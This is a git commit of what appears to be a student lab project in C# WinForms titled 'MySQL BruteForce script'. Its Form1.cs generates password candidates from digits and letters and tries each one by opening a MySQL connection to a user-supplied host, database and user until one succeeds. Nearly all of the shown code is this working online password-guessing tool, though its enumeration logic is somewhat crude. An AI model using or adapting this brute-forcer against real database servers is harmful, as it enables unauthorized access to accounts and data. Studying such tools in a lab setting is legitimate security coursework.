a254dd309bbc950b30c93f1ac8ec99796ef0862e
tuleshochka <sizyno.min@gmail.com>
2022-11-04 15:53:55 +0600

    Добавьте файлы проекта.

---
+++ lab3/Form1.Designer.cs
@@ -0,0 +1,219 @@
+﻿namespace lab3
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.comboBox1 = new System.Windows.Forms.ComboBox();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.textBox4 = new System.Windows.Forms.TextBox();
+            this.label6 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.textBox5 = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label1.Location = new System.Drawing.Point(12, 21);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(324, 16);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "IP-адрес, на котором находится база данных:";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label2.Location = new System.Drawing.Point(164, 58);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(167, 16);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "Название базы данных:";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label3.Location = new System.Drawing.Point(12, 97);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(319, 16);
+            this.label3.TabIndex = 1;
+            this.label3.Text = "Пользователь, из под которого хотите зайти:";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label4.Location = new System.Drawing.Point(172, 132);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(164, 16);
+            this.label4.TabIndex = 2;
+            this.label4.Text = "Длина пароля (\'  \'-\'  \'):";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label5.Location = new System.Drawing.Point(181, 182);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(150, 16);
+            this.label5.TabIndex = 3;
+            this.label5.Text = "Содержание пароля:";
+            // 
+            // comboBox1
+            // 
+            this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
+            this.comboBox1.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.comboBox1.FormattingEnabled = true;
+            this.comboBox1.Items.AddRange(new object[] {
+            "Только цифры",
+            "Только буквы",
+            "Цифры и буквы"});
+            this.comboBox1.Location = new System.Drawing.Point(344, 179);
+            this.comboBox1.Name = "comboBox1";
+            this.comboBox1.Size = new System.Drawing.Size(266, 24);
+            this.comboBox1.TabIndex = 4;
+            // 
+            // textBox1
+            // 
+            this.textBox1.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.textBox1.Location = new System.Drawing.Point(344, 21);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(266, 23);
+            this.textBox1.TabIndex = 5;
+            this.textBox1.Text = "127.0.0.1";
+            // 
+            // textBox2
+            // 
+            this.textBox2.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.textBox2.Location = new System.Drawing.Point(344, 55);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(266, 23);
+            this.textBox2.TabIndex = 5;
+            this.textBox2.Text = "mydb";
+            // 
+            // textBox3
+            // 
+            this.textBox3.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.textBox3.Location = new System.Drawing.Point(344, 94);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(266, 23);
+            this.textBox3.TabIndex = 5;
+            this.textBox3.Text = "tulesha";
+            // 
+            // textBox4
+            // 
+            this.textBox4.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.textBox4.Location = new System.Drawing.Point(344, 129);
+            this.textBox4.Name = "textBox4";
+            this.textBox4.Size = new System.Drawing.Size(266, 23);
+            this.textBox4.TabIndex = 5;
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label6.Location = new System.Drawing.Point(309, 155);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(301, 12);
+            this.label6.TabIndex = 6;
+            this.label6.Text = "Если поле пустое - скрипт перебирает все длины пароля ";
+            // 
+            // button1
+            // 
+            this.button1.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.button1.Location = new System.Drawing.Point(271, 219);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(134, 31);
+            this.button1.TabIndex = 7;
+            this.button1.Text = "Начать подбор";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // textBox5
+            // 
+            this.textBox5.BackColor = System.Drawing.SystemColors.Window;
+            this.textBox5.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.textBox5.ForeColor = System.Drawing.Color.Black;
+            this.textBox5.Location = new System.Drawing.Point(2, 260);
+            this.textBox5.Multiline = true;
+            this.textBox5.Name = "textBox5";
+            this.textBox5.Size = new System.Drawing.Size(642, 100);
+            this.textBox5.TabIndex = 8;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(646, 365);
+            this.Controls.Add(this.textBox5);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.textBox4);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.comboBox1);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "MySQL BruteForce script";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.ComboBox comboBox1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.TextBox textBox4;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox textBox5;
+    }
+}
+
---
+++ lab3/Form1.cs
@@ -0,0 +1,127 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Security;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using MySqlConnector;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement;
+
+namespace lab3
+{
+    public partial class Form1 : Form
+    {
+
+        public static int combinations = 0;
+
+        //current combination
+        public static string combination = "";
+
+        //password
+        public static string password = "a";
+        string[] letters_ =
+         {
+                    string.Empty, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+                    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
+                   
+            };
+        string[] digits =
+         {
+                    string.Empty, "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"
+            };
+        string[] letters_digits =
+{
+                    string.Empty, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+                    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
+                    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"
+            };
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private async void button1_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrEmpty(textBox1.Text)==true || string.IsNullOrEmpty(textBox2.Text) == true || string.IsNullOrEmpty(textBox3.Text) == true)
+            {
+                MessageBox.Show("Введите, пожалуйста, все данные","WARNING",MessageBoxButtons.OK,MessageBoxIcon.Warning);
+            }
+            else
+            {
+                string path;
+                string[] alphabet = letters_digits;
+                if (comboBox1.SelectedIndex == 0) alphabet = digits;
+                if (comboBox1.SelectedIndex == 1) alphabet = letters_;
+                if (comboBox1.SelectedIndex == 2) alphabet = letters_digits;
+
+                string[] pass_length = textBox4.Text.Split(new char[] { '-' }, StringSplitOptions.RemoveEmptyEntries);
+                int[] passlen = Array.ConvertAll(pass_length, s => int.Parse(s));
+                int letterarray = alphabet.Length;
+
+                int[] letter = new int[passlen[1]];
+                for(int a = 0; a < passlen[0]; a++)
+                {
+                    letter[a] = 1;
+                }
+                int i = 1;
+                bool f = true;
+
+                    while (i == 1)
+                    {
+                        for (int j = 0; j < passlen[1]; j++)
+                        {
+                            if (letter[j] == letterarray)
+                            {
+                                letter[j + 1]++;
+                                letter[j] = 1;
+                            }
+                            if (letter[passlen[1] - 1] == letterarray)
+                            {
+                                MessageBox.Show("Пароль не удалось подобрать");
+                                f = false;
+                                break;
+                            }
+                            combination = combination + alphabet[letter[j]];
+                        }
+                        textBox5.Text += "Пробуем пароль: " + combination + "\n";
+                        if (!f) break;
+                        letter[0]++;
+                    try
+                        {
+                            path = "server=" + textBox1.Text + ";user=" + textBox3.Text + ";database=" + textBox2.Text + ";password=" + combination + ";port=3306;";
+                            MySqlConnection conn = new MySqlConnection(path);
+                            conn.Open();
+                            textBox5.Text += "Пароль подошел";
+                            MessageBox.Show("Пароль подошел: " + combination);
+                            break;
+                        }
+                        catch (Exception)
+                        {
+                        }
+                        //Console.WriteLine(combination);
+                        combination = "";
+                    }
+               
+
+
+
+               /* for (int i = passlen[0]; i <= passlen[1]; i++)
+                {
+                    int size = i;
+                    for (int j = 0; j < size - 1; j++)
+                    {
+                        
+                    }
+                }*/
+            }
+
+
+
+        }
+    }
+}
